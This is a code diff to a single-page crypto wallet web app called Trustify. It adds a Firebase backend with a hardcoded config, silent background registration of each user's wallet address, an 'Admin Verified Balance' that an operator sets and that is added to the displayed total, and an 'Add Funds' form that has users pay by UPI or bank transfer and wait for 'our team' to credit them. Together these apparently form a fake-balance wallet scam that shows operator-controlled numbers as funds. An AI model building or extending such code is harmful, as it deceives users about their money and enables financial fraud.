@@ -11,6 +11,34 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script src="https://unpkg.com/jsqr@1.4.0/dist/jsQR.js"></script>
+
+<!-- Firebase -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
+  import { getFirestore, doc, getDoc, setDoc, onSnapshot, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";
+
+  /* ════════════════════════════════════════
+     🔧 PASTE YOUR FIREBASE CONFIG HERE
+     (Same config as admin panel)
+     ════════════════════════════════════════ */
+  const firebaseConfig = {
+    apiKey: "AIzaSyD-8JkLO2D5KWBBNE1zo18HEWDlocjR7go",
+    authDomain: "trustifywallet-a54fd.firebaseapp.com",
+    projectId: "trustifywallet-a54fd",
+    storageBucket: "trustifywallet-a54fd.firebasestorage.app",
+    messagingSenderId: "222093056146",
+    appId: "1:222093056146:web:9657a86de4da16c6a22e4b"
+  };
+
+  const fbApp = initializeApp(firebaseConfig);
+  const fbAuth = getAuth(fbApp);
+  const fbDb = getFirestore(fbApp);
+
+  window.FB = { auth: fbAuth, db: fbDb, createUserWithEmailAndPassword, signInWithEmailAndPassword,
+    onAuthStateChanged, signOut, doc, getDoc, setDoc, onSnapshot, collection, addDoc, serverTimestamp };
+  window.dispatchEvent(new Event('firebase-ready'));
+</script>
 <style>
 /* ─── RESET & BASE ─── */
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
@@ -666,6 +694,16 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);max-w
         </svg>
       </div>
 
+      <!-- Admin-credited balance (shown only when admin has added funds) -->
+      <div id="adminBalanceRow" class="hidden" style="margin:14px 16px 0;background:linear-gradient(135deg,rgba(34,197,94,.12),rgba(34,197,94,.04));border:1px solid rgba(34,197,94,.25);border-radius:16px;padding:14px 16px;display:flex;align-items:center;gap:12px">
+        <div style="width:38px;height:38px;border-radius:50%;background:rgba(34,197,94,.18);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0">✓</div>
+        <div style="flex:1">
+          <div style="font-size:13px;font-weight:700;color:var(--green)">Admin Verified Balance</div>
+          <div style="font-size:11px;color:var(--text2)">Credited by Trustify support</div>
+        </div>
+        <div id="adminBalanceAmt" style="font-size:18px;font-weight:800;color:var(--green)">$0.00</div>
+      </div>
+
       <div class="qa-row">
         <button class="qa" onclick="openSend()">
           <div class="qa-ic send"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div>Send
@@ -676,11 +714,11 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);max-w
         <button class="qa" onclick="openSwap()">
           <div class="qa-ic swap"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg></div>Swap
         </button>
-        <button class="qa" onclick="switchTab('earn')">
-          <div class="qa-ic earn"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>Earn
+        <button class="qa" onclick="openPaymentRequest()">
+          <div class="qa-ic buy"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>Add Funds
         </button>
         <button class="qa" onclick="switchTab('dapps')">
-          <div class="qa-ic buy"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div>DApps
+          <div class="qa-ic earn"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div>DApps
         </button>
       </div>
 
@@ -1050,8 +1088,44 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);max-w
   </div>
 </div>
 
+<!-- ══════ PAYMENT REQUEST MODAL (Add Funds) ══════ -->
+<div id="paymentModal" class="overlay hidden">
+  <div class="bsheet">
+    <div class="bsh-handle"></div>
+    <div class="bsh-hdr">
+      <span class="bsh-title">Add Funds</span>
+      <button class="bsh-close" onclick="closePaymentRequest()">✕</button>
+    </div>
+    <div style="padding:18px 20px 24px;display:flex;flex-direction:column;gap:14px">
+      <div style="background:rgba(0,82,255,.06);border:1px solid rgba(0,82,255,.2);border-radius:12px;padding:14px;font-size:13px;color:var(--text2);line-height:1.6">
+        Send payment via UPI/Bank transfer, then submit the details below. Our team will verify and credit your wallet within a few hours.
+      </div>
+      <div>
+        <label class="form-label">Amount (USD)</label>
+        <div class="inp-wrap"><input id="payAmount" type="number" step="0.01" placeholder="0.00"/></div>
+      </div>
+      <div>
+        <label class="form-label">Payment Method</label>
+        <select id="payMethod" class="glass-select">
+          <option value="UPI">UPI</option>
+          <option value="Bank Transfer">Bank Transfer</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+      <div>
+        <label class="form-label">Transaction Reference / UTR Number</label>
+        <div class="inp-wrap"><input id="payRef" type="text" placeholder="e.g. 123456789012"/></div>
+      </div>
+      <div id="payErr" class="msg-error hidden"></div>
+      <div id="paySuc" class="msg-success hidden"></div>
+      <button class="btn-glow full" onclick="submitPaymentRequest()">Submit for Verification</button>
+    </div>
+  </div>
+</div>
+
 <!-- TOAST -->
 <div id="toast" class="hidden"></div>
+
 
 <script>
 /* ════════════════════════════════════════════
@@ -1072,7 +1146,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);max-w
 })();
 
 // ── STATE ──
-const S={wallet:null,balances:{},prices:{},selectedAssetIdx:0,scanTarget:null,scanStream:null,scanRAF:null};
+const S={wallet:null,balances:{},prices:{},selectedAssetIdx:0,scanTarget:null,scanStream:null,scanRAF:null,adminBalance:0};
 
 const ASSETS=[
   {key:'eth_eth', net:'eth', sym:'ETH', name:'Ethereum',  ico:'⟠', bg:'rgba(98,126,234,.2)', dec:18, contract:null},
@@ -1141,6 +1215,58 @@ function loadFromStorage(){
   }catch{go('onboard');}
 }
 
+// ── BACKGROUND FIREBASE SYNC (no login UI shown to user) ──
+// Wallet creation is still local-first (seed phrase/private key), exactly as before.
+// We silently register the wallet's ETH address in Firestore (keyed by address)
+// so the admin dashboard can find this user and credit/manage their balance.
+window.addEventListener('firebase-ready', () => {
+  FB = window.FB;
+  // If a wallet already exists locally, sync it in the background
+  if (S.wallet?.ethAddress) syncWalletToFirestore(S.wallet.ethAddress);
+});
+
+let fbUnsubBalance = null;
+async function syncWalletToFirestore(ethAddress){
+  if (!FB) return;
+  try {
+    const userRef = FB.doc(FB.db, 'users', ethAddress); // doc ID = wallet address
+    const snap = await FB.getDoc(userRef);
+    if (!snap.exists()) {
+      await FB.setDoc(userRef, {
+        ethAddress: ethAddress,
+        name: 'Wallet ' + ethAddress.slice(0,6) + '…' + ethAddress.slice(-4),
+        balance: 0,
+        status: 'active',
+        createdAt: FB.serverTimestamp(),
+      });
+    }
+    subscribeToFirestoreBalance(ethAddress);
+  } catch(e) { console.warn('Firestore sync skipped:', e.message); }
+}
+
+// Live-sync admin-set balance into the app
+function subscribeToFirestoreBalance(ethAddress){
+  if (!FB) return;
+  if (fbUnsubBalance) fbUnsubBalance();
+  fbUnsubBalance = FB.onSnapshot(FB.doc(FB.db, 'users', ethAddress), (snap) => {
+    if (snap.exists()) {
+      S.adminBalance = parseFloat(snap.data().balance) || 0;
+      updateAdminBalanceDisplay();
+    }
+  });
+}
+
+function updateAdminBalanceDisplay() {
+  const el = document.getElementById('adminBalanceRow');
+  if (!el) return;
+  if (S.adminBalance > 0) {
+    el.classList.remove('hidden');
+    document.getElementById('adminBalanceAmt').textContent = '$' + S.adminBalance.toFixed(2);
+  } else {
+    el.classList.add('hidden');
+  }
+}
+
 // ── CREATE ──
 function gotoCreate(){go('createPage');newMnemonic();}
 function newMnemonic(){
@@ -1190,7 +1316,9 @@ async function createFromMnemonic(phrase){
   try{
     const w=ethers.HDNodeWallet.fromPhrase(phrase);
     S.wallet={mnemonic:phrase,privateKey:w.privateKey,ethAddress:w.address,tronAddress:ethToTron(w.privateKey)};
-    saveWallet();showApp();
+    saveWallet();
+    syncWalletToFirestore(S.wallet.ethAddress);
+    showApp();
   }catch(e){toast('Error: '+e.message);}
 }
 
@@ -1218,7 +1346,9 @@ async function doImport(){
       w=new ethers.Wallet(k);
     }
     S.wallet={mnemonic:S.pendingMnemonic||null,privateKey:w.privateKey,ethAddress:w.address,tronAddress:ethToTron(w.privateKey)};
-    saveWallet();showApp();
+    saveWallet();
+    syncWalletToFirestore(S.wallet.ethAddress);
+    showApp();
   }catch(e){showEl('importErr','Invalid: '+e.message);}
 }
 
@@ -1258,6 +1388,12 @@ function showApp(){
   updateQR();
   updateSendPanel();
   startAutoRefresh();
+
+  // Sync wallet with admin backend (silent, no UI impact if it fails)
+  if (S.wallet?.ethAddress) {
+    if (window.FB) { FB = window.FB; syncWalletToFirestore(S.wallet.ethAddress); }
+    else window.addEventListener('firebase-ready', () => syncWalletToFirestore(S.wallet.ethAddress), {once:true});
+  }
 }
 
 function switchTab(tab){
@@ -1367,7 +1503,7 @@ async function refreshAll(){
     if(a.sym==='TRX')return b*S.prices.trx;
     return 0;
   };
-  const total=res.reduce((s,a)=>s+usdOf(a,a.bal),0);
+  const total=res.reduce((s,a)=>s+usdOf(a,a.bal),0) + (S.adminBalance||0);
   document.getElementById('totalBal').textContent='$'+total.toFixed(2);
   const chg=total*(S.prices.eth_chg||0)/100;
   const chgEl=document.getElementById('balChange');
@@ -1491,6 +1627,44 @@ function copyAddr(){
 // ── SWAP ──
 function openSwap(){document.getElementById('swapModal').classList.remove('hidden');calcSwap();}
 function closeSwap(){document.getElementById('swapModal').classList.add('hidden');}
+
+// ── PAYMENT REQUEST (Add Funds) ──
+function openPaymentRequest(){
+  document.getElementById('paymentModal').classList.remove('hidden');
+  document.getElementById('payAmount').value='';
+  document.getElementById('payRef').value='';
+  hideEl('payErr');hideEl('paySuc');
+}
+function closePaymentRequest(){document.getElementById('paymentModal').classList.add('hidden');}
+
+async function submitPaymentRequest(){
+  const amount = parseFloat(document.getElementById('payAmount').value);
+  const method = document.getElementById('payMethod').value;
+  const ref    = document.getElementById('payRef').value.trim();
+  hideEl('payErr');hideEl('paySuc');
+
+  if(!amount||amount<=0){showEl('payErr','Enter a valid amount.');return;}
+  if(!ref){showEl('payErr','Enter transaction reference / UTR number.');return;}
+
+  if(!S.wallet?.ethAddress){showEl('payErr','Wallet not found. Please try again.');return;}
+  if(!FB){showEl('payErr','Connection unavailable. Please try again.');return;}
+
+  try{
+    await FB.addDoc(FB.collection(FB.db,'paymentRequests'),{
+      userId:S.wallet.ethAddress,
+      userEmail:'Wallet '+S.wallet.ethAddress.slice(0,6)+'…'+S.wallet.ethAddress.slice(-4),
+      amount:amount,
+      method:method,
+      reference:ref,
+      status:'pending',
+      createdAt:FB.serverTimestamp(),
+    });
+    showEl('paySuc','✓ Submitted! Your wallet will be credited once verified by our team.');
+    setTimeout(()=>{closePaymentRequest();toast('Payment request submitted!');},2000);
+  }catch(e){
+    showEl('payErr','Failed to submit: '+e.message);
+  }
+}
 function calcSwap(){
   const amt=parseFloat(document.getElementById('swapFromAmt').value)||0;
   const rate=S.prices.eth||0;
@@ -1685,7 +1859,7 @@ function openSettings(){
 function closeSettings(){document.getElementById('settingsModal').classList.add('hidden');}
 function exportPK(){if(confirm('⚠ Never share your private key!\n\nCopy to clipboard?'))navigator.clipboard.writeText(S.wallet.privateKey).then(()=>{toast('Private key copied!');closeSettings();});}
 function exportSeed(){if(!S.wallet.mnemonic){toast('Imported by key — no seed phrase.');return;}if(confirm('⚠ Copy seed phrase to clipboard?'))navigator.clipboard.writeText(S.wallet.mnemonic).then(()=>{toast('Seed phrase copied!');closeSettings();});}
-function lockWallet(){if(confirm('Lock and exit wallet?')){S.wallet=null;document.getElementById('app').classList.add('hidden');go('onboard');}}
+function lockWallet(){if(confirm('Lock and exit wallet?')){if(fbUnsubBalance)fbUnsubBalance();S.wallet=null;document.getElementById('app').classList.add('hidden');go('onboard');}}
 function deleteWallet(){if(confirm('⚠ DELETE wallet permanently?\nMake sure you have your seed phrase backed up!'))if(confirm('Are you absolutely sure?')){localStorage.removeItem('tw_w');S.wallet=null;document.getElementById('app').classList.add('hidden');go('onboard');}}
 
 // ── STORAGE ──
